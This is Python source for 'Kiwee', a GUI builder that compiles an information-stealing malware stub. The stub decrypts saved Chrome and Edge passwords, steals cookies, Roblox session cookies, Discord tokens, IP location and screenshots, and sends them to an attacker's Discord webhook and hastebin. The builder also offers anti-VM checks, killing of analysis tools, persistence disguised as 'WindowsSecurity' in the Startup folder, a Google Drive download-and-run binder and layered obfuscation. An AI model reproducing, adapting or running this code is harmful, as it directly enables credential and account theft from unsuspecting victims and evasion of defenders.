import os,sys,requests,re,marshal,base64,zlib,shutil
from tkinter import *
from tkinter import messagebox
from tkinter.filedialog import askopenfilename
import webbrowser
from discord_webhook import DiscordWebhook, DiscordEmbed
from time import sleep
window = Tk()
window.title("Kiwee")
window.geometry("782x475")
window.maxsize(782, 475)
window.minsize(782, 475)
window.iconbitmap("assets/mylogo.ico")
window.config(background='#484848')
bg1 = PhotoImage(file='assets/background1.png')
bg = PhotoImage(file='assets/background.png')
setupbu = PhotoImage(file='assets/img0.png')
setupbu2 = PhotoImage(file='assets/img0e.png')
compilerbu = PhotoImage(file='assets/img3.png')
compilerbu2 = PhotoImage(file='assets/img3e.png')
settingbu = PhotoImage(file='assets/img2.png')
settingbu2 = PhotoImage(file='assets/img2e.png')
aboutbu = PhotoImage(file='assets/img1.png')
aboutbu2 = PhotoImage(file='assets/img1e.png')
browsebu = PhotoImage(file='assets/img4.png')
blankbu = PhotoImage(file='assets/blankbu.png')
fullbu = PhotoImage(file='assets/fullbu.png')
testbu = PhotoImage(file='assets/img5.png')
bg2 = PhotoImage(file='assets/compilebg.png')
buildbu = PhotoImage(file='assets/buidbu.png')
checkbu = PhotoImage(file='assets/checkbu.png')
installbu = PhotoImage(file='assets/installbu.png')
bg3 = PhotoImage(file='assets/settingbg.png')
bg4 = PhotoImage(file='assets/aboutbg.png')
insta = PhotoImage(file='assets/ig.png')
disco = PhotoImage(file='assets/dsc.png')
btc= PhotoImage(file='assets/btc.png')
fc = PhotoImage(file='assets/fc.png')
Kiwee_Grabber = r'''
import os,json,base64,shutil,requests,re
from Cryptodome.Cipher import AES
from sqlite3 import connect
from win32crypt import CryptUnprotectData
from discord_webhook import DiscordWebhook,DiscordEmbed
from time import sleep
from urllib.request import Request, urlopen
from winreg import HKEY_CURRENT_USER, OpenKey, EnumValue
from PIL import ImageGrab

class Password:
    def __init__(self):
        self.dataz = "=== Kiwee Grabber ==="
        try:
            appdata = os.path.join(os.environ["USERPROFILE"], "AppData")
            local_state_path = os.path.join(os.environ["USERPROFILE"], "AppData", "Local", "Google", "Chrome", "User Data", "Local State")
            key = self.get_encryption_key(local_state_path)
            db_path = os.path.join(os.environ["USERPROFILE"], "AppData", "Local", "Google", "Chrome", "User Data", "default", "Login Data")
            filename = "\\ChromeData.db"
            shutil.copyfile(db_path, appdata+filename)
            db = connect(appdata+filename)
            cursor = db.cursor()
            cursor.execute("select origin_url, action_url, username_value, password_value, date_created, date_last_used from logins order by date_created")
            for row in cursor.fetchall():
                origin_url = row[0]
                action_url = row[1]
                username = row[2]
                password = self.decrypt_password(row[3], key)
                self.dcreate = row[4]
                self.dlu = row[5]        
                if username or password:
                    self.dataz += f"\nOrigin URL: {origin_url}\nAction URL: {action_url}\nUsername: {username}\nPassword: {password}\nGOOGLE CHROME\n"
                else:
                    continue
                self.dataz+="="*50
            cursor.close()
            db.close()
        except:self.dataz +="\nNo Password Found For Google Chrome\n"
        try:
            os.remove(filename)
        except:
            pass
        self.edge_passwords()
    def get_encryption_key(self,local_state_path):
        with open(local_state_path, "r", encoding="utf-8") as f:
            local_state = f.read()
            local_state = json.loads(local_state)
        key = base64.b64decode(local_state["os_crypt"]["encrypted_key"])
        key = key[5:]
        return CryptUnprotectData(key, None, None, None, 0)[1]
    def decrypt_password(self,password, key):
        try:
            iv = password[3:15]
            password = password[15:]
            cipher = AES.new(key, AES.MODE_GCM, iv)
            return cipher.decrypt(password)[:-16].decode()
        except:
            try:
                return str(CryptUnprotectData(password, None, None, None, 0)[1])
            except:
                return ""
    def decrypt_payload2(self,cipher, payload):
        return cipher.decrypt(payload)
    def generate_cipher2(self,aes_key, iv):
        return AES.new(aes_key, AES.MODE_GCM, iv)
    def decrypt_password2(self,buff, master_key):
        try:
            iv = buff[3:15]
            payload = buff[15:]
            cipher = self.generate_cipher2(master_key, iv)
            decrypted_pass = self.decrypt_payload2(cipher, payload)
            decrypted_pass = decrypted_pass[:-16].decode()
            return decrypted_pass
        except:pass
    def edge_passwords(self):
        try:
            appdata = os.path.join(os.environ["USERPROFILE"], "AppData")
            local_state_path = os.path.join(os.environ["USERPROFILE"], "AppData", "Local", "Microsoft", "Edge", "User Data","Local State")
            key = self.get_encryption_key(local_state_path)
            login_db = os.path.join(os.environ["USERPROFILE"],"AppData", "Local", "Microsoft", "Edge", "User Data", "Default", "Login Data")
            shutil.copy2(login_db, appdata+"\\Loginvault.db")
            conn = connect(appdata+"\\Loginvault.db")
            cursor = conn.cursor()
            try:
                cursor.execute("SELECT action_url, username_value, password_value FROM logins")
                for r in cursor.fetchall():
                    url = r[0]
                    username = r[1]
                    encrypted_password = r[2]
                    decrypted_password = self.decrypt_password(encrypted_password, key)
                    try:
                        self.dataz += f"\nOrigin URL: {url}\nUsername: {username}\nPassword: {decrypted_password}\nMICROSOFT EDGE\n"
                    except:pass
                    self.dataz+="="*50
                self.dataz+='\nGrabbed With Kiwee Grabber, by : vesper\n'
                self.dataz+="="*50
            except:pass
        except:self.dataz+="\nNo Password Found For Edge"
        r = requests.post('https://www.toptal.com/developers/hastebin/documents',data = self.dataz)
        key = r.json()['key']
        self.site = "https://www.toptal.com/developers/hastebin/"+key
        
    def __repr__(self):
        return self.site
class Cookie:
    def get_encryption_key(self):
        local_state_path = os.path.join(os.environ["USERPROFILE"], "AppData", "Local", "Google", "Chrome", "User Data", "Local State")
        with open(local_state_path, "r", encoding="utf-8") as f:
            local_state = f.read()
            local_state = json.loads(local_state)
        key = base64.b64decode(local_state["os_crypt"]["encrypted_key"])
        key = key[5:]
        return CryptUnprotectData(key, None, None, None, 0)[1]
    def decrypt_data(self,data, key):
        try:
            iv = data[3:15]
            data = data[15:]
            cipher = AES.new(key, AES.MODE_GCM, iv)
            return cipher.decrypt(data)[:-16].decode()
        except:
            try:
                return str(CryptUnprotectData(data, None, None, None, 0)[1])
            except:
                return ""
    def __init__(self):
        self.robloxcookies = []
        dataz = "=== Kiwee Grabber ==="
        try:
            appdata = os.path.join(os.environ["USERPROFILE"], "AppData")
            db_path = os.path.join(os.environ["USERPROFILE"], "AppData", "Local", "Google", "Chrome", "User Data", "Default", "Network", "Cookies")
            filename = "\\Cookies.db"
            if not os.path.isfile(appdata+filename):
                shutil.copyfile(db_path, appdata+filename)
            db = connect(appdata+filename)
            db.text_factory = lambda b: b.decode(errors="ignore")
            cursor = db.cursor()
            cursor.execute("""
            SELECT host_key, name, value, encrypted_value
            FROM cookies""")
            key = self.get_encryption_key()
            for host_key, name, value, encrypted_value in cursor.fetchall():
                if not value:
                    decrypted_value = self.decrypt_data(encrypted_value, key)
                else:
                    decrypted_value = value
                if '_|WARNING:-DO-NOT-SHARE-THIS.--Sharing-this-will-allow-someone-to-log-in-as-you-and-to-steal-your-ROBUX-and-items.|_' in decrypted_value:
                    self.robloxcookies.append(decrypted_value)
                else:
                    dataz += f"\nHost: {host_key}\nCookie Name: {name}\nValue: {decrypted_value}\n"
                cursor.execute("""
                UPDATE cookies SET value = ?, has_expires = 1, expires_utc = 99999999999999999, is_persistent = 1, is_secure = 0
                WHERE host_key = ?
                AND name = ?""", (decrypted_value, host_key, name))
            db.commit()
            db.close()
            dataz+="="*50
            dataz+='\nGrabbed With Kiwee Grabber, by : vesper\n'
            dataz+="="*50
        except:dataz += "\nNo Cookies Found"
        r = requests.post('https://www.toptal.com/developers/hastebin/documents',data = dataz)
        key = r.json()['key']
        self.site = "https://www.toptal.com/developers/hastebin/"+key
        cnt = 0
        for i in self.robloxcookies:
            cnt +=1
        if cnt == 0:
            pass
        else:
            with open(appdata+'\\roblox_cookiesc.txt', 'w') as f:
                for i in self.robloxcookies:
                    f.write(i+"\n")
                    f.write('=')
                    f.write('\n')
                f.close()
    def __repr__(self):
        return self.site
class DiscordTokenGrab:
    def __init__(self):
        self.regex = r"[\w-]{24}\.[\w-]{6}\.[\w-]{27}", r"mfa\.[\w-]{84}"
        self.encrypted_regex = r"dQw4w9WgXcQ:[^.*\['(.*)'\].*$][^\"]*"
        self.appdata = os.getenv('LOCALAPPDATA')
        self.roaming = os.getenv('APPDATA')
        self.main()
    def scrapeTokens(self,path):
        tokens = []
        for file_name in os.listdir(path):
            if not file_name.endswith('.log') and not file_name.endswith('.ldb'):
                continue

            for line in [x.strip() for x in open(f'{path}\\{file_name}', errors='ignore').readlines() if x.strip()]:
                for regex in (r'[\w-]{24}\.[\w-]{6}\.[\w-]{27}', r'mfa\.[\w-]{84}'):
                    for token in re.findall(regex, line):
                        tokens.append(token)
        return tokens
    def main(self):
        def getheaders(token=None, content_type="application/json"):
            headers = {
                "Content-Type": content_type,
                "User-Agent": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.11 (KHTML, like Gecko) Chrome/23.0.1271.64 Safari/537.11"
            }
            if token:
                headers.update({"Authorization": token})
            return headers
        def getavatar(uid, aid):
            url = f"https://cdn.discordapp.com/avatars/{uid}/{aid}.gif"
            try:
                urlopen(Request(url))
            except:
                url = url[:-4]
            return url
        paths = {
            'Discord': self.roaming + r'\\discord\\Local Storage\\leveldb\\',
            'Discord Canary': self.roaming + r'\\discordcanary\\Local Storage\\leveldb\\',
            'Lightcord': self.roaming + r'\\Lightcord\\Local Storage\\leveldb\\',
            'Discord PTB': self.roaming + r'\\discordptb\\Local Storage\\leveldb\\',
            'Opera': self.roaming + r'\\Opera Software\\Opera Stable\\Local Storage\\leveldb\\',
            'Opera GX': self.roaming + r'\\Opera Software\\Opera GX Stable\\Local Storage\\leveldb\\',
            'Amigo': self.appdata + r'\\Amigo\\User Data\\Local Storage\\leveldb\\',
            'Torch': self.appdata + r'\\Torch\\User Data\\Local Storage\\leveldb\\',
            'Kometa': self.appdata + r'\\Kometa\\User Data\\Local Storage\\leveldb\\',
            'Orbitum': self.appdata + r'\\Orbitum\\User Data\\Local Storage\\leveldb\\',
            'CentBrowser': self.appdata + r'\\CentBrowser\\User Data\\Local Storage\\leveldb\\',
            '7Star': self.appdata + r'\\7Star\\7Star\\User Data\\Local Storage\\leveldb\\',
            'Sputnik': self.appdata + r'\\Sputnik\\Sputnik\\User Data\\Local Storage\\leveldb\\',
            'Vivaldi': self.appdata + r'\\Vivaldi\\User Data\\Default\\Local Storage\\leveldb\\',
            'Chrome SxS': self.appdata + r'\\Google\\Chrome SxS\\User Data\\Local Storage\\leveldb\\',
            'Chrome': self.appdata + r'\\Google\\Chrome\\User Data\\Default\\Local Storage\\leveldb\\',
            'Epic Privacy Browser': self.appdata + r'\\Epic Privacy Browser\\User Data\\Local Storage\\leveldb\\',
            'Microsoft Edge': self.appdata + r'\\Microsoft\\Edge\\User Data\\Defaul\\Local Storage\\leveldb\\',
            'Uran': self.appdata + r'\\uCozMedia\\Uran\\User Data\\Default\\Local Storage\\leveldb\\',
            'Yandex': self.appdata + r'\\Yandex\\YandexBrowser\\User Data\\Default\\Local Storage\\leveldb\\',
            'Brave': self.appdata + r'\\BraveSoftware\\Brave-Browser\\User Data\\Default\\Local Storage\\leveldb\\',
            'Iridium': self.appdata + r'\\Iridium\\User Data\\Default\\Local Storage\\leveldb\\'
        }
        for platform, path in paths.items():
            if not os.path.exists(path):
                continue
            tokens = self.scrapeTokens(path)
            if len(tokens) > 0:
                for token in tokens:
                    r = requests.get("https://discord.com/api/v9/users/@me", headers=getheaders(token))
                    if r.status_code == 200:
                        j = requests.get("https://discord.com/api/v9/users/@me", headers=getheaders(token)).json()
                        sleep(0.2)
                        user = j["username"] + "#" + str(j["discriminator"])
                        user_id = j["id"]
                        avatar_id = j["avatar"]
                        avatar_url2 = getavatar(user_id, avatar_id)
                        webhook = DiscordWebhook(url=webhookw, username="Kiwee", avatar_url=r"https://cdn.discordapp.com/attachments/954181734314942504/967883618452144188/kiwee-removebg-preview.png")
                        embed = DiscordEmbed(title=f"Discord", description=f"Found Discord Token", color='299D00')
                        embed.set_author(name="author : vesper", icon_url=r'https://cdn.discordapp.com/attachments/954181734314942504/967883618452144188/kiwee-removebg-preview.png')
                        embed.set_footer(text='Kiwee Grabber || vesper#0003 (c)')
                        embed.set_timestamp()
                        embed.add_embed_field(name="Username :", value=f"```{user}```", ineline=False)
                        embed.add_embed_field(name="Token :", value=f"```{token}```", ineline=False)
                        embed.set_thumbnail(url=avatar_url2)
                        webhook.add_embed(embed)
                        response = webhook.execute()
def desktopscreen():
    try:
        screeny = ImageGrab.grab(bbox=None,include_layered_windows=False,all_screens=True,xdisplay=None)
        screeny.save("testy.jpg")
        screeny.close()
        webhook = DiscordWebhook(url=webhookw, username="Kiwee", avatar_url=r"https://cdn.discordapp.com/attachments/954181734314942504/967883618452144188/kiwee-removebg-preview.png")
        with open('testy.jpg', 'rb') as f:
            webhook.add_file(file=f.read(), filename='testy.jpg')
        response = webhook.execute()
        os.remove('testy.jpg')
    except:pass
def roblox_studio_cookie():
    robloxstudiopath = OpenKey(HKEY_CURRENT_USER, r"SOFTWARE\Roblox\RobloxStudioBrowser\roblox.com")
    try:
        count = 0
        while True:
            name, value, type = EnumValue(robloxstudiopath, count)
            if name == ".ROBLOSECURITY":
                return value
            count = count + 1
    except WindowsError:
        pass
def roblox_info(cookie):
    global webhookw
    if '_|WARNING:-DO-NOT-SHARE-THIS.--Sharing-this-will-allow-someone-to-log-in-as-you-and-to-steal-your-ROBUX-and-items.|_' in cookie:
        if len(cookie) >= 600:
            webhook = DiscordWebhook(url=webhookw, username="Kiwee", avatar_url=r"https://cdn.discordapp.com/attachments/954181734314942504/967883618452144188/kiwee-removebg-preview.png")
            embed = DiscordEmbed(title=f"Roblox", description=f"Found Roblox Cookie", color='299D00')
            embed.set_author(name="author : vesper", icon_url=r'https://cdn.discordapp.com/attachments/954181734314942504/967883618452144188/kiwee-removebg-preview.png')
            embed.set_footer(text='Kiwee Grabber || vesper#0003 (c)')
            embed.set_timestamp()
            embed.add_embed_field(name="Cookie :", value=f"```{cookie}```", ineline=False)
            webhook.add_embed(embed)
            response = webhook.execute()
def loc():
    data = requests.get("http://ipinfo.io/json").json()
    try:
        ip = data['ip']
    except:ip = None
    try:
        city = data['city']
    except:city = None
    try:
        country = data['country']
    except:country = None
    try:
        region = data['region']
    except:region = None
    return ip, city, country, region
def grabba():
    global webhookw
    try:
        cookie = str(roblox_studio_cookie())
        rcookie = cookie.split("COOK::<")[1].split(">")[0]
    except:rcookie = "rawr"
    appdata = os.path.join(os.environ["USERPROFILE"], "AppData")
    password_site = Password()
    cookie_site = Cookie()
    ip,city,country,region = loc()
    main_info = {
  "username":"Kiwee",
  'avatar_url': 'https://cdn.discordapp.com/attachments/954181734314942504/967883618452144188/kiwee-removebg-preview.png',
  "content": '@everyone',
  "embeds": [
    {
      "title": "New Hit",
      "description": "Someone Ran Your Malware !",
      "color": 3195668,
      "fields": [
        {
          "name": "Location",
          "value": f"```\nIP : {ip}\nCountry : {country}\nRegion : {region}\nCity : {city}\n```"
        },
        {
          "name": "Password",
          "value": f"Passwords : **{password_site}**"
        },
        {
          "name": "Cookie",
          "value": f"Cookies : **{cookie_site}**"
        }
      ],
      "author": {
        "name": "author : vesper",
        "icon_url": "https://cdn.discordapp.com/attachments/954181734314942504/967883618452144188/kiwee-removebg-preview.png"
      }
    }
  ],
  "attachments": []
}
    requests.post(webhookw, json=main_info)
    sleep(0.4)
    DiscordTokenGrab() # Get discord tokens
    # look for roblox cookies
    sleep(0.3)
    if os.path.exists(appdata+"\\roblox_cookiesc.txt"):
        roblox_cookie = open(appdata+'\\roblox_cookiesc.txt','r')
        rcontent = roblox_cookie.read()
        new = rcontent.replace('\n','').split('=')
        for i in new:
            roblox_info(i)
        roblox_cookie.close()
        os.remove(appdata+"\\roblox_cookiesc.txt")
    sleep(0.2)
    if rcookie != 'rawr':
        roblox_info(rcookie)
    sleep(0.3)
    #grab screenshot
    desktopscreen()
grabba()
'''
class Kiwee:
    def __init__(self):
        self.antivmcode = ''
        self.antiprocesscode=''
        self.startupcode = ''
        self.antivm = False
        self.antiprocess = False
        self.obfuscate = False
        self.addstartup = False
        self.appdata = False
        self.temp = False
        self.noconsole = False
        self.errormsg = False
        self.setup()
    def browseico(self):
        self.iconname = askopenfilename(filetypes=(("ico files","*.ico"),("All files","*.*")))
        messagebox.showinfo('Kiwee', f'File Chose : {self.iconname}')
    def antivmlol(self):
        if self.antivm == False:self.antivm=True;self.antivmb.config(image=fullbu);self.antivmcode=r"""
try:
    import os
    import sys
    from psutil import process_iter
    if os.path.exists("C:\WINDOWS\system32\drivers\vmci.sys"):sys.exit()
    if os.path.exists("C:\WINDOWS\system32\drivers\vmhgfs.sys"):sys.exit()
    if os.path.exists("C:\WINDOWS\system32\drivers\vmmouse.sys"):sys.exit()
    if os.path.exists("C:\WINDOWS\system32\drivers\vmusbmouse.sys"):sys.exit()
    if os.path.exists("C:\WINDOWS\system32\drivers\vmx_svga.sys"):sys.exit()
    if os.path.exists("C:\WINDOWS\system32\drivers\VBoxMouse.sys"):sys.exit()
    for kiwee in process_iter():
        if kiwee.name().lower() == "vmsrvc.exe".lower() or kiwee.name().lower() == "vmusrvc.exe".lower() or kiwee.name().lower() == "vboxtray.exe".lower() or kiwee.name().lower() == "vmtoolsd.exe".lower() or kiwee.name().lower() == "vboxservice.exe".lower():sys.exit()
except:pass
        """
        else:self.antivm=False;self.antivmb.config(image=blankbu);self.antivmcode=''
    def antiprocesslol(self):
        if self.antiprocess==False:self.antiprocess=True;self.antiprocessb.config(image=fullbu);self.antiprocesscode=r"""
try:       
    from psutil import process_iter, NoSuchProcess, AccessDenied, ZombieProcess
    def kiweeend(kiweenamez):
        for kiweeproc in process_iter():
            try:
                for ki in kiweenamez: 
                    if ki.lower() in kiweeproc.name().lower():kiweeproc.kill()
            except (NoSuchProcess, AccessDenied, ZombieProcess):pass
    def kiweestart():kiweenames = ['http', 'traffic', 'wireshark', 'fiddler', 'packet', 'process'];return kiweeend(kiweenamez=kiweenames)  
    kiweestart()
except:pass
        """
        else:self.antiprocess=False;self.antiprocessb.config(image=blankbu);self.antiprocesscode=''
    def obfuscatelol(self):
        if self.obfuscate == False:self.obfuscate=True;self.obfuscateb.config(image=fullbu)
        else:self.obfuscate=False;self.obfuscateb.config(image=blankbu)
    def addstartuplol(self):
        if self.addstartup==False:self.addstartup=True;self.addstartupb.config(image=fullbu);self.startupcode=r"""
from sys import argv;import getpass
user = getpass.getuser()
file = argv[0]
try:
    ext =file.split("\\")[-1].split('.')[-1]
    poop = open(file, 'rb')
    okpoopinpants = poop.read()
    with open(f'C:\\Users\\{user}\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\WindowsSecurity.{ext}', 'wb') as f:
        f.write(okpoopinpants)
except:pass      
        """
        else:self.addstartup=False;self.addstartupb.config(image=blankbu);self.startupcode=''
    def bindappdata(self):
        if self.appdata==False:self.appdata=True;self.appdatab.config(image=fullbu);self.temp=False;self.tempb.config(image=blankbu)
        else:self.appdata=False;self.appdatab.config(image=blankbu)
    def bindtemp(self):
        if self.temp==False:self.temp=True;self.tempb.config(image=fullbu);self.appdata=False;self.appdatab.config(image=blankbu)
        else:self.temp=False;self.tempb.config(image=blankbu)
    def noconsolelol(self):
        if self.noconsole==False:self.noconsole=True;self.noconsoleb.config(image=fullbu)
        else:self.noconsole=False;self.noconsoleb.config(image=blankbu)
    def testwebhook(self):
        try:
            webhookz = self.webhook.get()
            a = True
        except:messagebox.showerror('Kiwee', 'Invalid Webhook');a=False
        if a == True:
            try:
                webhook = DiscordWebhook(url=webhookz, username="Kiwee", avatar_url=r"https://cdn.discordapp.com/attachments/954181734314942504/967883618452144188/kiwee-removebg-preview.png")
                embed = DiscordEmbed(title=f"Working", description=f"Your Webhook is working !", color='299D00')
                embed.set_author(name="author : vesper", icon_url=r'https://cdn.discordapp.com/attachments/954181734314942504/967883618452144188/kiwee-removebg-preview.png')
                embed.set_footer(text='Kiwee Grabber || vesper#0003 (c)')
                embed.set_timestamp()
                webhook.add_embed(embed)
                response = webhook.execute()
            except:messagebox.showerror('Kiwee', 'Invalid Webhook')
    def errormsglol(self):
        if self.errormsg==False:self.errormsg=True;self.errormsgb.config(image=fullbu)
        else:self.errormsg=False;self.errormsgb.config(image=blankbu)
    def installrequirements(self):
        try:
            os.system('requirements.bat')
            messagebox.showinfo('Kiwee', 'Successfully Installed Requirements! You can now setup and build your stub')
        except:messagebox.showerror('Kiwee','Error Occured ! Make sure you have Python in PATH')
    def installpython(self):
        try:
            webbrowser.open('https://www.python.org/ftp/python/3.9.5/python-3.9.5-amd64.exe')
            messagebox.showinfo('Kiwee','Make sure to add python to PATH')
        except:messagebox.showerror('Kiwee', 'Error Occured')
    def instagram(self):
        webbrowser.open('https://www.instagram.com/i_might_be_vesper/')
    def discord(self):
        webbrowser.open('https://discord.gg/FyCUdSVqwa')
    def bitcoin(self):
        os.system('echo ' + 'bc1qq3kuqn39h4uf2kr80230gqrj8k4gf9sx5ppzuf'.strip() + '| clip')
        messagebox.showinfo('Kiwee', 'BTC Address Copied to Clipboard!')
    def checkversion(self):
        try:
            messagebox.showinfo('Kiwee', f'Your version : {sys.version}')
        except:messagebox.showerror('Kiwee', 'You dont have python')
    def compileexe(self):
        isicon = True
        try:
            name = self.new_name
            if len(name) < 1:
                name = "Default"
        except:name = "Default"
        try:
            icon = self.iconname
            if os.path.exists(icon):
                pass
            else:
                isicon=False
        except:isicon=False
        sleep(3)
        if isicon and self.noconsole:
            os.system(f'pyinstaller --onefile --name {name} --icon {icon} --noconsole --clean --log-level=INFO --hidden-import="sqlite3" --hidden-import="requests" --hidden-import="psutil" --hidden-import="discord_webhook" --hidden-import="win32crypt" --hidden-import="Cryptodome" --hidden-import="Cryptodome.Cipher.AES" --hidden-import="pycryptodomex" --hidden-import="PIL.ImageGrab" --hidden-import="PIL" File.py')
        elif isicon == False and self.noconsole:
            os.system(f'pyinstaller --onefile --name {name} --noconsole --clean --log-level=INFO --hidden-import="sqlite3" --hidden-import="requests" --hidden-import="psutil" --hidden-import="discord_webhook" --hidden-import="win32crypt" --hidden-import="Cryptodome" --hidden-import="Cryptodome.Cipher.AES" --hidden-import="pycryptodomex" --hidden-import="PIL.ImageGrab" --hidden-import="PIL" File.py')
        elif isicon and self.noconsole == False:
            os.system(f'pyinstaller --onefile --name {name} --icon {icon} --clean --log-level=INFO --hidden-import="sqlite3" --hidden-import="requests" --hidden-import="psutil" --hidden-import="discord_webhook" --hidden-import="win32crypt" --hidden-import="Cryptodome" --hidden-import="Cryptodome.Cipher.AES" --hidden-import="pycryptodomex" --hidden-import="PIL.ImageGrab" --hidden-import="PIL" File.py')
        elif isicon == False and self.noconsole == False:
            os.system(f'pyinstaller --onefile --name {name} --clean --log-level=INFO --hidden-import="sqlite3" --hidden-import="requests" --hidden-import="psutil" --hidden-import="discord_webhook" --hidden-import="win32crypt" --hidden-import="Cryptodome" --hidden-import="Cryptodome.Cipher.AES" --hidden-import="pycryptodomex" --hidden-import="PIL.ImageGrab" --hidden-import="PIL" File.py')
        try:
            shutil.move(f"{os.getcwd()}\\dist\\{name}.exe", f"{os.getcwd()}\\{name}.exe")
            shutil.rmtree('build')
            shutil.rmtree('dist')
            shutil.rmtree('__pycache__')
            os.remove(f'{name}.spec')
            os.remove('File.py')
            bgg2= Label(window, image=fc, borderwidth=0,bg='#434343')
            bgg2.place(x=249, y=61)
            messagebox.showinfo('Kiwee', 'Successfully Built Stub !');self.compile()
        except:
            try:
                shutil.rmtree('build')
                shutil.rmtree('dist')
                shutil.rmtree('__pycache__')
                os.remove(f'{name}.spec')
                messagebox.showerror('Kiwee', 'Oh oh.. Something went wrong !');self.compile()
            except:pass

    def obfuscatethis(self):
        b64 = lambda _monkay : base64.b64encode(_monkay)
        mar = lambda _monkay : marshal.dumps(compile(_monkay,'what_are_those','exec'))
        zlb = lambda _monkay : zlib.compress(_monkay)
        file = open('File.py','r')
        a = file.read()
        for x in range(3):
            method = repr(b64(zlb(mar(a.encode('utf8'))))[::-1])
            data = "exec(__import__('marshal').loads(__import__('zlib').decompress(__import__('base64').b64decode(%s[::-1]))))" % method
        z = []
        for i in data:
            z.append(ord(i))
        beforemarsh ="_ = %s\nexec(''.join(chr(__) for __ in _))" % z
        marsrc = compile(beforemarsh, 'Good_Luck_Lmao', 'exec')
        obfmarsh = marshal.dumps(marsrc)
        t = zlib.compress(obfmarsh)
        code = f"import marshal,zlib;exec(marshal.loads(zlib.decompress({t})))"
        file.close()
        with open('File.py', 'w+') as f:
            f.write(code)
        return True
    def makefile(self):
        webhook = self.webhook.get()
        filecont = fr"""
{self.antivmcode}
{self.antiprocesscode}
{self.startupcode}
{self.binda}
{self.errormsgcode}
webhookw = "{webhook}"
{Kiwee_Grabber}
            """
        marsrc = compile(filecont, 'hey_you', 'exec')
        encode1 = marshal.dumps(marsrc)
        code = f"import marshal;exec(marshal.loads({encode1}))"
        with open('File.py', 'w+') as f:
            f.write(code)
            f.close()
        if self.obfuscate == True:
            if self.obfuscatethis() == True:
                self.compileexe()
        else:
            self.compileexe()
        
    def verifyshit(self):
        meow = False
        while True:
            #check webhook
            webhook = self.webhook.get()
            if "discord.com" in webhook or "discordapp.com" in webhook:
                x = requests.get(webhook)
                if x.status_code ==200:
                    pass
                else:messagebox.showerror('Kiwee','Invalid Webhook');break
            else:messagebox.showerror('Kiwee','Invalid Webhook');break
            # verify name
            name = self.name.get()
            try:
                self.new_name = name.replace(" ","_")
            except:pass
            try:
                googleshare = self.googleshare.get()
                if "https://drive.google.com/file/d/" in googleshare:
                    ID = googleshare.split("/")[5]
                    newurl = f'https://drive.google.com/uc?export=download&id={ID}'
                    try:
                        content = requests.get(newurl)
                        header = content.headers['Content-Disposition']
                        re.search(r'filename="(.*)"', header).group(1)
                    except:messagebox.showerror("Kiwee", 'Your Sharing Link is Private');self.binda = "";break
                    self.binda = fr"""
try:
    import os, requests, re, getpass
    user = getpass.getuser()
    url = '{googleshare}'
    """
                    self.binda += r"""
    ID = url.split("/")[5]
    newurl = f'https://drive.google.com/uc?export=download&id={ID}'
    content = requests.get(newurl)
    header = content.headers['Content-Disposition']
    file_name = re.search(r'filename="(.*)"', header).group(1)
    if os.path.exists(f'C:\\Users\\{user}\\AppData\\Roaming\\{file_name}'):
        os.system(f'start C:\\Users\\{user}\\AppData\\Roaming\\{file_name}')
    else:
        open(f'C:\\Users\\{user}\\AppData\\Roaming\\{file_name}', 'wb').write(content.content)
        os.system(f'start C:\\Users\\{user}\\AppData\\Roaming\\{file_name}')
except:pass
                            """
                    if self.appdata == False and self.temp == False:
                        self.appdata = True
                elif len(googleshare) == 0:
                    self.binda = ""
                else:messagebox.showerror("Kiwee",'Invalid Google Drive Sharing Link');self.binda = "";break
            except:self.binda = ""
            if self.errormsg == True:
                emsg = self.errormsge.get()
                if len(emsg) > 1:
                    self.errormsgcode = fr"""
import os, getpass
user = getpass.getuser()
msg = "{emsg}"
"""         
                    self.errormsgcode +=r"""
try:
    if os.path.exists(f'C:\\Users\\{user}\\AppData\\Roaming\\error.vbs'):
        os.system(f'start C:\\Users\\{user}\\AppData\\Roaming\\error.vbs')
    else:
        open(f'C:\\Users\\{user}\\AppData\\Roaming\\error.vbs', 'w+').write(f'''
x=MsgBox("{msg}", vbOkOnly+vbCritical, "Error")
            ''')
        os.system(f'start C:\\Users\\{user}\\AppData\\Roaming\\error.vbs')
except:pass
                    """
                else:messagebox.showerror('Kiwee', 'Invalid Message For Error Message');self.errormsgcode="";break
            else:self.errormsgcode =""
            meow = True;break
        if meow == False:
            self.compile()
        else:
            self.makefile()

    def setup(self):
        bgg1 = Label(window, image=bg1, borderwidth=0)
        bgg1.place(x=0, y=0)
        bgg = Label(window, image=bg, borderwidth=0)
        bgg.place(x=166, y=0)
        #tabs
        self.gotosetup = Button(window, image=setupbu,bg='#299D00',borderwidth=0, activebackground="#299D00",command=self.setup)
        self.gotosetup.place(x=-3,y=178)
        self.gotocompiler = Button(window, image=compilerbu,bg='#299D00',borderwidth=0, activebackground="#299D00",command=self.compile)
        self.gotocompiler.place(x=-3,y=241)
        self.gotosettings = Button(window, image=settingbu,bg='#299D00',borderwidth=0, activebackground="#299D00",command=self.settings)
        self.gotosettings.place(x=-3,y=304)
        self.gotoabout = Button(window, image=aboutbu,bg='#299D00',borderwidth=0, activebackground="#299D00",command=self.about)
        self.gotoabout.place(x=-3,y=367)
        self.gotosetup = Button(window, image=setupbu2,bg='#299D00',borderwidth=0, activebackground="#299D00",command=self.setup)
        self.gotosetup.place(x=-3,y=178)
        ####setup gui####
        #not optional
        self.webhook = Entry(window,text='b',font=('SeoulHangang',10),bg='#989898', fg='#299D00',width=20,borderwidth=0)
        self.webhook.place(x=222, y=80)
        testwbh = Button(window, image=testbu,bg='#242424',borderwidth=0, activebackground="#242424",command=self.testwebhook)
        testwbh.place(x=353,y=77)
        #optional
        browse = Button(window, image=browsebu,bg='#242424',borderwidth=0, activebackground="#242424",command=self.browseico)
        browse.place(x=275,y=126)
        self.name = Entry(window,text='a',font=('SeoulHangang',10),bg='#989898', fg='#299D00',width=29,borderwidth=0)
        self.name.place(x=222, y=204)
        if self.antivm == False:
            self.antivmb = Button(window, image=blankbu,bg='#242424',borderwidth=0, activebackground="#242424",command=self.antivmlol)
            self.antivmb.place(x=353,y=259)
        else:
            self.antivmb = Button(window, image=fullbu,bg='#242424',borderwidth=0, activebackground="#242424",command=self.antivmlol)
            self.antivmb.place(x=353,y=259)
        if self.antiprocess == False:
            self.antiprocessb = Button(window, image=blankbu,bg='#242424',borderwidth=0, activebackground="#242424",command=self.antiprocesslol)
            self.antiprocessb.place(x=353,y=298)
        else:
            self.antiprocessb = Button(window, image=fullbu,bg='#242424',borderwidth=0, activebackground="#242424",command=self.antiprocesslol)
            self.antiprocessb.place(x=353,y=298)
